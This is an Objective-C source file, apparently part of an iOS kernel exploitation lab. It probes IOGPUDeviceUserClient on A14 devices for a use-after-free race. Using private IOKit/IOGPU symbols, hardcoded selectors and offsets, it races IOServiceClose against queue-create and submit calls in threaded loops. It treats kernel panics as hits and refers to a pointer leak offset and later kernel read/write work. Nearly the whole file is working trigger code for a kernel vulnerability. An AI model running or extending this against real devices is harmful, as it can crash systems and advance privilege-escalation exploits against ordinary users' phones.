#import "T014CloseRaceProbe.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

/* iOS app SDK has no public IOKit headers. */
typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;

/*
 * T014 — IOGPUDeviceUserClient close vs method (diagnostic).
 * Retargeted for A14 26.5 / 23F77 (was XR 22H311).
 *
 * A14 23F77: QueueCreate is sel=6 stIn=0x410 (NOT XR sel=7 / 0x408).
 * Destroy is sel=7 scIn=1 qid. Submit is sel=25 (NOT XR sel=26).
 * word1 = *(queue+0x558), not XR/21D50 +0x550.
 * No spray. No fake vtable. No KRW attempt.
 */

#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"

typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef void *(*DevCreate_t)(io_service_t);
typedef uint32_t (*GetConn_t)(void *);
typedef void (*DevRelease_t)(void *);
typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
typedef uint32_t (*QueueGetID_t)(void *);

static NSMutableString *t014_buf;
static int t014_fd = -1;

static void t014_log(const char *fmt, ...) {
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if (n > (int)sizeof(lb) - 2) n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (t014_buf) [t014_buf appendFormat:@"%.*s", n, lb];
        if (t014_fd >= 0) {
            write(t014_fd, lb, (size_t)n);
            fcntl(t014_fd, F_FULLFSYNC);
        }
    }
}

static NSString *t014_finish(void) {
    if (t014_fd >= 0) {
        fcntl(t014_fd, F_FULLFSYNC);
        close(t014_fd);
        t014_fd = -1;
    }
    return t014_buf ?: @"STOP: no log";
}

static int t014_openlog(const char *tag) {
    t014_buf = [NSMutableString string];
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"t014_close_log.txt"];
    t014_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_APPEND, 0644);
    t014_log("========== %s %s ==========", tag, [[[NSDate date] description] UTF8String]);
    return t014_fd >= 0;
}

typedef struct {
    IOServiceMatching_t matching;
    IOServiceGetMatchingService_t getsvc;
    IOServiceClose_t close;
    IOObjectRelease_t release;
    IOConnectCallMethod_t call;
    mach_port_t mainPort;
    DevCreate_t devCreate;
    GetConn_t getConn;
    DevRelease_t devRelease;
    QueueCreate_t queueCreate;
    QueueGetID_t queueGetID;
    io_service_t svc;
    uint32_t sel7sz; /* A14 create size; 0x410 */
} T014IO;

static int t014_syms(T014IO *io) {
    memset(io, 0, sizeof(*io));
    io->sel7sz = A14_23F77_IOGPU_QUEUE_CREATE_SIZE;
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        t014_log("STOP dlopen iokit=%p iogpu=%p", iokit, iogpu);
        return -1;
    }
    io->matching = dlsym(iokit, "IOServiceMatching");
    io->getsvc = dlsym(iokit, "IOServiceGetMatchingService");
    io->close = dlsym(iokit, "IOServiceClose");
    io->release = dlsym(iokit, "IOObjectRelease");
    io->call = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    io->devCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    io->getConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    io->devRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    io->queueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    io->queueGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    if (!io->matching || !io->getsvc || !io->close || !io->call || !mp ||
        !io->devCreate || !io->getConn) {
        t014_log("STOP dlsym");
        return -1;
    }
    io->mainPort = *mp;
    io->svc = io->getsvc(io->mainPort, io->matching("IOGPU"));
    if (!io->svc) {
        t014_log("STOP no IOGPU service");
        return -1;
    }
    t014_log("IOGPU svc=%u close=%p DeviceCreate=%p", io->svc, io->close, io->devCreate);
    t014_log("[*] A14 23F77: create sel=%u stIn=0x%x destroy sel=%u submit sel=%u leak +0x%x SysMem +0x%x",
             A14_23F77_IOGPU_QUEUE_CREATE_SEL, A14_23F77_IOGPU_QUEUE_CREATE_SIZE,
             A14_23F77_IOGPU_QUEUE_DESTROY_SEL, A14_23F77_IOGPU_SUBMIT_SEL,
             A14_23F77_IOGPU_QUEUE_LEAK, A14_23F77_SYSMEM_MD_OFF);
    return 0;
}

static uint32_t t014_typeid(void *dev) {
    if (!dev) return 0;
    return *(uint32_t *)((uint8_t *)dev + 0x08);
}

static kern_return_t t014_sel7_sz(T014IO *io, io_connect_t conn, uint32_t typeId,
                                  uint32_t insz, uint32_t *qidOut, uint64_t *w1Out) {
    uint8_t inBuf[0x600];
    uint8_t outBuf[0x10];
    if (insz < A14_23F77_IOGPU_QUEUE_CREATE_SIZE) insz = A14_23F77_IOGPU_QUEUE_CREATE_SIZE;
    if (insz > sizeof(inBuf)) insz = (uint32_t)sizeof(inBuf);
    memset(inBuf, 0, sizeof(inBuf));
    memset(outBuf, 0, sizeof(outBuf));
    *(uint32_t *)(inBuf + 0x400) = 1;
    *(uint8_t *)(inBuf + 0x404) = (uint8_t)typeId;
    size_t outCnt = sizeof(outBuf);
    kern_return_t r = io->call(conn, A14_23F77_IOGPU_QUEUE_CREATE_SEL, NULL, 0, inBuf, insz,
                               NULL, NULL, outBuf, &outCnt);
    if (qidOut) *qidOut = (uint32_t)(*(uint64_t *)outBuf);
    if (w1Out) *w1Out = *(uint64_t *)(outBuf + 8);
    return r;
}

static kern_return_t t014_sel8(T014IO *io, io_connect_t conn, uint32_t qid) {
    uint64_t sc[1] = { qid };
    return io->call(conn, A14_23F77_IOGPU_QUEUE_DESTROY_SEL, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

static kern_return_t t014_sel26(T014IO *io, io_connect_t conn, uint32_t qid) {
    uint64_t sc[4] = { qid, 0, 1, 0x40 };
    uint8_t st[0x40];
    memset(st, 0, sizeof(st));
    return io->call(conn, A14_23F77_IOGPU_SUBMIT_SEL, sc, A14_23F77_IOGPU_SUBMIT_SCIN,
                    st, sizeof(st), NULL, NULL, NULL, NULL);
}

static const char *t014_krname(kern_return_t r) {
    if (r == 0) return "SUCCESS";
    if ((unsigned)r == 0xe00002c2) return "kIOReturnBadArgument";
    if ((unsigned)r == 0xe00002c7) return "kIOReturnNotOpen";
    if ((unsigned)r == 0xe00002bd) return "kIOReturnNoDevice";
    if ((unsigned)r == 0xe00002c9) return "kIOReturnBusy";
    if ((unsigned)r == 0xe00002c5) return "kIOReturnNotPermitted";
    if ((unsigned)r == 0x10000003) return "MACH_SEND_INVALID_DEST";
    if ((unsigned)r == 0x10000015) return "MACH_SEND_INVALID_HEADER";
    if (r == KERN_INVALID_NAME) return "KERN_INVALID_NAME";
    if (r == KERN_INVALID_RIGHT) return "KERN_INVALID_RIGHT";
    return "?";
}

static void t014_calibrate_sel7(T014IO *io, io_connect_t conn, uint32_t typeId) {
    t014_log("[*] QueueCreate sel=%u size sweep (A14 expected 0x410)...",
             A14_23F77_IOGPU_QUEUE_CREATE_SEL);
    for (uint32_t sz = A14_23F77_IOGPU_QUEUE_CREATE_SIZE; sz <= 0x600; sz += 8) {
        uint32_t qid = 0;
        uint64_t w1 = 0;
        kern_return_t r = t014_sel7_sz(io, conn, typeId, sz, &qid, &w1);
        if (r == 0) {
            io->sel7sz = sz;
            t014_log("  sel=7 OK sz=0x%x qid=%u w1=0x%llx (A14 leak @+0x%x)",
                     sz, qid, (unsigned long long)w1, A14_23F77_IOGPU_QUEUE_LEAK);
            if (qid) t014_sel8(io, conn, qid);
            return;
        }
        if (sz == A14_23F77_IOGPU_SEL7_MIN_IN || sz == 0x410 || sz == 0x500)
            t014_log("  sel=7 sz=0x%x -> 0x%08x (%s)", sz, (unsigned)r, t014_krname(r));
    }
    t014_log("  WARNING: no sel=7 size worked 0x408..0x600; keeping 0x%x", io->sel7sz);
}

static kern_return_t t014_sel7(T014IO *io, io_connect_t conn, uint32_t typeId,
                               uint32_t *qidOut) {
    return t014_sel7_sz(io, conn, typeId, io->sel7sz, qidOut, NULL);
}

typedef struct {
    T014IO *io;
    io_connect_t conn;
    uint32_t typeId;
    int which; /* 7 or 26 */
    uint32_t qid;
    atomic_int *stop;
    atomic_uint *calls;
    atomic_uint *ok;
    atomic_int last;
} T014Race;

static void *t014_wirer(void *u) {
    T014Race *rc = u;
    while (!atomic_load(rc->stop)) {
        kern_return_t r;
        if (rc->which == 26) r = t014_sel26(rc->io, rc->conn, rc->qid);
        else r = t014_sel7(rc->io, rc->conn, rc->typeId, NULL);
        atomic_store(&rc->last, (int)r);
        atomic_fetch_add(rc->calls, 1);
        if (r == 0) atomic_fetch_add(rc->ok, 1);
    }
    return NULL;
}

static NSString *t014_gate(const char *tag) {
    if (!t014_openlog(tag)) return @"STOP log";
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"T014"];
    if (stop) {
        t014_log("%s", stop.UTF8String);
        return t014_finish();
    }
    return nil;
}

@implementation T014CloseRaceProbe

+ (NSString *)runSerialBaseline {
    NSString *g = t014_gate("T014-A serial");
    if (g) return g;
    t014_log("[A] create sel=%u stIn=0x%x / destroy sel=%u. Must survive. No close race.",
             A14_23F77_IOGPU_QUEUE_CREATE_SEL, A14_23F77_IOGPU_QUEUE_CREATE_SIZE,
             A14_23F77_IOGPU_QUEUE_DESTROY_SEL);
    T014IO io;
    if (t014_syms(&io) != 0) return t014_finish();
    void *dev = io.devCreate(io.svc);
    if (!dev) { t014_log("STOP DeviceCreate"); return t014_finish(); }
    io_connect_t conn = io.getConn(dev);
    uint32_t typeId = t014_typeid(dev);
    t014_log("conn=%u typeId=0x%x", conn, typeId);
    t014_calibrate_sel7(&io, conn, typeId);
    for (int i = 0; i < 8; i++) {
        uint32_t qid = 0;
        kern_return_t r = t014_sel7(&io, conn, typeId, &qid);
        t014_log("[A] sel=7 #%d -> 0x%08x (%s) qid=%u", i, (unsigned)r, t014_krname(r), qid);
        if (r == 0 && qid) {
            kern_return_t d = t014_sel8(&io, conn, qid);
            t014_log("[A]   sel=8 qid=%u -> 0x%08x (%s)", qid, (unsigned)d, t014_krname(d));
        }
    }
    if (io.devRelease) io.devRelease(dev);
    if (io.release) io.release(io.svc);
    t014_log("=== verdict A: SURVIVED serial sel=7/8 ===");
    t014_log("If this failed, stop the morning battery — IOGPU entry is broken.");
    return t014_finish();
}

+ (NSString *)runPostClose {
    NSString *g = t014_gate("T014-B post-close"); if (g) return g;
    t014_log("[B] IOServiceClose then sel=7 on THE SAME port name.");
    t014_log("[B] expect MACH_SEND_INVALID_DEST / INVALID_NAME — port died with close.");
    T014IO io;
    if (t014_syms(&io) != 0) return t014_finish();
    void *dev = io.devCreate(io.svc);
    if (!dev) { t014_log("STOP DeviceCreate"); return t014_finish(); }
    io_connect_t conn = io.getConn(dev);
    uint32_t typeId = t014_typeid(dev);
    t014_calibrate_sel7(&io, conn, typeId);
    uint32_t qid = 0;
    kern_return_t r0 = t014_sel7(&io, conn, typeId, &qid);
    t014_log("[B] pre-close sel=7 -> 0x%08x (%s) qid=%u", (unsigned)r0, t014_krname(r0), qid);
    t014_log("[B] CLOSE conn=%u", conn);
    kern_return_t rc = io.close(conn);
    t014_log("[B] IOServiceClose -> 0x%08x (%s)", (unsigned)rc, t014_krname(rc));
    uint32_t q2 = 0;
    kern_return_t r1 = t014_sel7(&io, conn, typeId, &q2);
    t014_log("[B] post-close sel=7 -> 0x%08x (%s) qid=%u", (unsigned)r1, t014_krname(r1), q2);
    if (io.release) io.release(io.svc);
    if (r1 == 0)
        t014_log("=== verdict B: UNEXPECTED SUCCESS after close — UC still live ===");
    else
        t014_log("=== verdict B: SURVIVED — post-close on same name did not reach a live UC (%s) ===",
                 t014_krname(r1));
    return t014_finish();
}

+ (NSString *)runExtraSendRight {
    NSString *g = t014_gate("T014-F extra-send"); if (g) return g;
    t014_log("[F] COPY_SEND, close original, sel=7 on extra.");
    t014_log("[F] INVALID_DEST = port died. panic far=0 = method hit NULL +0x120.");
    t014_log("[F] 0xe00002c2/SUCCESS = method ran on a still-valid device.");
    T014IO io;
    if (t014_syms(&io) != 0) return t014_finish();
    void *dev = io.devCreate(io.svc);
    if (!dev) { t014_log("STOP DeviceCreate"); return t014_finish(); }
    io_connect_t conn = io.getConn(dev);
    uint32_t typeId = t014_typeid(dev);
    t014_calibrate_sel7(&io, conn, typeId);
    mach_port_t extra = MACH_PORT_NULL;
    mach_msg_type_name_t acquired = 0;
    kern_return_t ex = mach_port_extract_right(mach_task_self(), conn,
                                               MACH_MSG_TYPE_COPY_SEND,
                                               &extra, &acquired);
    t014_log("[F] COPY_SEND conn=%u extra=%u acquired=0x%x -> 0x%08x (%s)",
             conn, extra, acquired, (unsigned)ex, t014_krname(ex));
    if (ex != KERN_SUCCESS || extra == MACH_PORT_NULL) {
        t014_log("STOP extract_right");
        return t014_finish();
    }
    uint32_t qid = 0;
    kern_return_t r0 = t014_sel7(&io, extra, typeId, &qid);
    t014_log("[F] extra sel=7 before close -> 0x%08x (%s) qid=%u",
             (unsigned)r0, t014_krname(r0), qid);
    t014_log("[F] CLOSE original conn=%u  (if next line missing = panic in close)", conn);
    kern_return_t rc = io.close(conn);
    t014_log("[F] IOServiceClose -> 0x%08x (%s)", (unsigned)rc, t014_krname(rc));
    t014_log("[F] FIRE sel=7 on extra=%u  (missing line after this = kernel took the call)", extra);
    uint32_t q2 = 0;
    kern_return_t r1 = t014_sel7(&io, extra, typeId, &q2);
    t014_log("[F] extra sel=7 after close -> 0x%08x (%s) qid=%u",
             (unsigned)r1, t014_krname(r1), q2);
    mach_port_deallocate(mach_task_self(), extra);
    if (io.release) io.release(io.svc);
    if (r1 == 0)
        t014_log("=== verdict F: extra still works after close — last-ref was NOT this UC ===");
    else if ((unsigned)r1 == 0x10000003 || r1 == KERN_INVALID_NAME || r1 == KERN_INVALID_RIGHT)
        t014_log("=== verdict F: extra died with close — no post-close kernel path ===");
    else
        t014_log("=== verdict F: extra reached kernel after close (%s) — paste this + IPS if panic ===",
                 t014_krname(r1));
    return t014_finish();
}

+ (NSString *)runSel7VsClose {
    NSString *g = t014_gate("T014-C create-vs-close"); if (g) return g;
    t014_log("[C] same-UC sel=7 loop vs IOServiceClose. 40 iters, jitter 0..800us.");
    t014_log("[C] panic far=0 = NULL +0x120. non-zero FAR / PAC = TOCTOU on freed device.");
    t014_log("[C] app crash without IPS = dead port. SURVIVED = serialized or window missed.");
    T014IO io;
    if (t014_syms(&io) != 0) return t014_finish();

    unsigned survived = 0, closed = 0;
    static const useconds_t jit[] = { 0, 20, 50, 100, 200, 400, 800, 1500 };
    {
        void *cdev = io.devCreate(io.svc);
        if (cdev) {
            t014_calibrate_sel7(&io, io.getConn(cdev), t014_typeid(cdev));
            if (io.devRelease) io.devRelease(cdev);
            else io.close(io.getConn(cdev));
        }
    }
    for (int iter = 0; iter < 40; iter++) {
        void *dev = io.devCreate(io.svc);
        if (!dev) { t014_log("[C] DeviceCreate fail iter=%d", iter); break; }
        io_connect_t conn = io.getConn(dev);
        uint32_t typeId = t014_typeid(dev);
        atomic_int stop = 0;
        atomic_uint calls = 0, ok = 0;
        T014Race rc = {0};
        rc.io = &io;
        rc.conn = conn;
        rc.typeId = typeId;
        rc.which = 7;
        rc.stop = &stop;
        rc.calls = &calls;
        rc.ok = &ok;
        atomic_store(&rc.last, 0);
        pthread_t th;
        if (pthread_create(&th, NULL, t014_wirer, &rc) != 0) {
            t014_log("STOP pthread");
            return t014_finish();
        }
        useconds_t j = jit[iter % 8];
        usleep(j);
        t014_log("[C] iter=%d jitter=%u close conn=%u calls_so_far=%u",
                 iter, j, conn, atomic_load(&calls));
        kern_return_t cr = io.close(conn);
        closed++;
        atomic_store(&stop, 1);
        pthread_join(th, NULL);
        t014_log("[C]   close=0x%08x (%s) calls=%u ok=%u last=0x%08x (%s)",
                 (unsigned)cr, t014_krname(cr),
                 atomic_load(&calls), atomic_load(&ok),
                 (unsigned)atomic_load(&rc.last), t014_krname(atomic_load(&rc.last)));
        survived++;
        /* do not DeviceRelease after we closed the connect */
    }
    if (io.release) io.release(io.svc);
    t014_log("=== verdict C: SURVIVED %u/%u (close issued %u) — no in-flight UAF this run ===",
             survived, 40u, closed);
    return t014_finish();
}

+ (NSString *)runSel26VsClose {
    NSString *g = t014_gate("T014-D submit-vs-close"); if (g) return g;
    t014_log("[D] create queue, then sel=26 loop vs IOServiceClose.");
    t014_log("[D] sel=26 loads +0x120 LATE — more likely to see the NULL after close.");
    T014IO io;
    if (t014_syms(&io) != 0) return t014_finish();
    if (!io.queueCreate || !io.queueGetID) {
        t014_log("STOP no IOGPUCommandQueueCreate/GetID");
        return t014_finish();
    }

    unsigned survived = 0;
    static const useconds_t jit[] = { 0, 20, 50, 100, 200, 400, 800, 1500 };
    {
        void *cdev = io.devCreate(io.svc);
        if (cdev) {
            t014_calibrate_sel7(&io, io.getConn(cdev), t014_typeid(cdev));
            if (io.devRelease) io.devRelease(cdev);
            else io.close(io.getConn(cdev));
        }
    }
    for (int iter = 0; iter < 30; iter++) {
        void *dev = io.devCreate(io.svc);
        if (!dev) { t014_log("[D] DeviceCreate fail iter=%d", iter); break; }
        io_connect_t conn = io.getConn(dev);
        uint32_t typeId = t014_typeid(dev);
        uint8_t args[0x600];
        memset(args, 0, sizeof(args));
        *(uint32_t *)(args + 0x400) = 1;
        *(uint8_t *)(args + 0x404) = (uint8_t)typeId;
        uint32_t qsz = io.sel7sz ? io.sel7sz : 0x410;
        void *q = io.queueCreate(dev, args, qsz);
        uint32_t qid = q ? io.queueGetID(q) : 0;
        t014_log("[D] iter=%d conn=%u q=%p qid=%u", iter, conn, q, qid);
        if (!qid) {
            t014_log("[D]   no qid — skip");
            continue;
        }
        atomic_int stop = 0;
        atomic_uint calls = 0, ok = 0;
        T014Race rc = {0};
        rc.io = &io;
        rc.conn = conn;
        rc.typeId = typeId;
        rc.which = 26;
        rc.qid = qid;
        rc.stop = &stop;
        rc.calls = &calls;
        rc.ok = &ok;
        pthread_t th;
        if (pthread_create(&th, NULL, t014_wirer, &rc) != 0) {
            t014_log("STOP pthread");
            return t014_finish();
        }
        useconds_t j = jit[iter % 8];
        usleep(j);
        t014_log("[D]   jitter=%u CLOSE (missing next line = panic in close/submit)", j);
        kern_return_t cr = io.close(conn);
        atomic_store(&stop, 1);
        pthread_join(th, NULL);
        t014_log("[D]   close=0x%08x (%s) calls=%u ok=%u last=0x%08x (%s)",
                 (unsigned)cr, t014_krname(cr),
                 atomic_load(&calls), atomic_load(&ok),
                 (unsigned)atomic_load(&rc.last), t014_krname(atomic_load(&rc.last)));
        survived++;
    }
    if (io.release) io.release(io.svc);
    t014_log("=== verdict D: SURVIVED %u/30 — sel=26 vs close did not panic ===", survived);
    return t014_finish();
}

+ (NSString *)runTwoConnLastRef {
    NSString *g = t014_gate("T014-E two-conn"); if (g) return g;
    t014_log("[E] two DeviceCreate. Phase 1: close B while A sel=7 — A must keep working.");
    t014_log("[E] Phase 2: close A vs A's sel=7 (last UC). Same TOCTOU as C.");
    T014IO io;
    if (t014_syms(&io) != 0) return t014_finish();

    void *devA = io.devCreate(io.svc);
    void *devB = io.devCreate(io.svc);
    if (!devA || !devB) {
        t014_log("STOP DeviceCreate A=%p B=%p", devA, devB);
        return t014_finish();
    }
    io_connect_t a = io.getConn(devA);
    io_connect_t b = io.getConn(devB);
    uint32_t typeA = t014_typeid(devA);
    uint32_t typeB = t014_typeid(devB);
    t014_log("[E] A conn=%u type=0x%x  B conn=%u type=0x%x", a, typeA, b, typeB);
    t014_calibrate_sel7(&io, a, typeA);

    uint32_t qA = 0, qB = 0;
    kern_return_t rA = t014_sel7(&io, a, typeA, &qA);
    kern_return_t rB = t014_sel7(&io, b, typeB, &qB);
    t014_log("[E] pre A sel=7 -> 0x%08x qid=%u   B sel=7 -> 0x%08x qid=%u",
             (unsigned)rA, qA, (unsigned)rB, qB);

    atomic_int stop = 0;
    atomic_uint calls = 0, ok = 0;
    T014Race rc = {0};
    rc.io = &io;
    rc.conn = a;
    rc.typeId = typeA;
    rc.which = 7;
    rc.stop = &stop;
    rc.calls = &calls;
    rc.ok = &ok;
    pthread_t th;
    if (pthread_create(&th, NULL, t014_wirer, &rc) != 0) {
        t014_log("STOP pthread");
        return t014_finish();
    }
    usleep(2000);
    t014_log("[E] phase1 CLOSE B=%u while A running", b);
    kern_return_t cB = io.close(b);
    usleep(2000);
    unsigned afterB = atomic_load(&ok);
    t014_log("[E]   closeB=0x%08x (%s) A_ok_after=%u lastA=0x%08x (%s)",
             (unsigned)cB, t014_krname(cB), afterB,
             (unsigned)atomic_load(&rc.last), t014_krname(atomic_load(&rc.last)));

    t014_log("[E] phase2 CLOSE A=%u (possible last-ref) vs in-flight sel=7", a);
    kern_return_t cA = io.close(a);
    atomic_store(&stop, 1);
    pthread_join(th, NULL);
    t014_log("[E]   closeA=0x%08x (%s) calls=%u ok=%u last=0x%08x (%s)",
             (unsigned)cA, t014_krname(cA),
             atomic_load(&calls), atomic_load(&ok),
             (unsigned)atomic_load(&rc.last), t014_krname(atomic_load(&rc.last)));

    if (io.release) io.release(io.svc);
    if (afterB == 0)
        t014_log("=== verdict E: A died when B closed — device last-ref was shared unexpectedly ===");
    else
        t014_log("=== verdict E: SURVIVED — A kept working after B close (%u ok); last-ref close A did not panic ===",
                 afterB);
    return t014_finish();
}

@end
